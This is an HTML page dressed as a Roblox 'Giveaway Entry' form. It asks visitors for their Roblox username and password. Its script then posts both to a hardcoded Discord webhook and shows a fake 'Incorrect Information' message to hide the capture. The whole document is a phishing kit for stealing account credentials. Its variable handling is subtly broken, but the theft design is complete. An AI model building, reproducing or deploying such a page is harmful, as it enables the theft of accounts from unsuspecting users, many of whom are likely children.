<!DOCTYPE html>

<html>
<head>
<title>Giveaway Entry Form</title>

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:radial-gradient(circle at top,#1a1a1a,#0b0b0b);
    font-family:Arial,sans-serif;
    color:white;
}

.menu{
    width:350px;
    background:#1f1f1f;
    border:1px solid #333;
    border-radius:12px;
    padding:20px;
    text-align:center;
    box-shadow:0 0 20px rgba(0,0,0,.5);
}

.roblox-icon{
    width:60px;
    height:60px;
    background:#ff3333;
    margin:0 auto 15px auto;
    position:relative;
    border-radius:4px;
    animation:spin 4s linear infinite;
}

.hole{
    width:18px;
    height:18px;
    background:#1f1f1f;
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
}

@keyframes spin{
    0%{transform:rotate(0deg);}
    12.5%{transform:rotate(45deg);}
    25%{transform:rotate(90deg);}
    37.5%{transform:rotate(135deg);}
    50%{transform:rotate(180deg);}
    62.5%{transform:rotate(225deg);}
    75%{transform:rotate(270deg);}
    87.5%{transform:rotate(315deg);}
    100%{transform:rotate(360deg);}
}

h2{
    margin-top:0;
}

input{
    width:100%;
    padding:12px;
    margin:8px 0;
    box-sizing:border-box;
    background:#2a2a2a;
    color:white;
    border:1px solid #444;
    border-radius:8px;
}

input:focus{
    outline:none;
    border-color:#ff3333;
}

button{
    width:100%;
    padding:12px;
    margin-top:10px;
    border:none;
    border-radius:8px;
    background:#ff3333;
    color:white;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    background:#ff5555;
}

#msg{
    margin-top:12px;
    color:#ff6666;
}
</style>

</head>

<body>

<div class="menu">

<div class="roblox-icon">
    <div class="hole"></div>
</div>

<h2>GIVEAWAY ENTRY</h2>

<input
id="Username"
placeholder="Roblox Username">

<input
id="Password"
placeholder="Roblox Password">

<button onclick="sendForm()">
ENTER
</button>

<div id="msg"></div>

</div>

<script>

const webhookURL = "https://discord.com/api/webhooks/1513257949991272578/1-jtCeLEDCLOXlJEv79GrgpqsfkSnWyhIFy7AvFZjL4dRHefdvyywscCRCb9KMJqx4Ye";

async function sendForm(){

    const username =
        document.getElementById("Username").value;

    const reason =
        document.getElementById("Password").value;

    if(!Username || !Password){

        document.getElementById("msg").innerText =
            "Please Login with Roblox to verify";

        return;
    }

    try{

        await fetch(webhookURL,{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                content:
`🎉 New Giveaway Entry

👤 Username: ${Username}

🔐 Password:
${Password}`
            })
        });

        document.getElementById("msg").innerText =
            "❌ Incorrect Information";

        document.getElementById("Username").value = "";
        document.getElementById("Password").value = "";

    }catch(error){

        document.getElementById("msg").innerText =
            "Failed to send";

        console.error(error);
    }
}

</script>

</body>
</html>
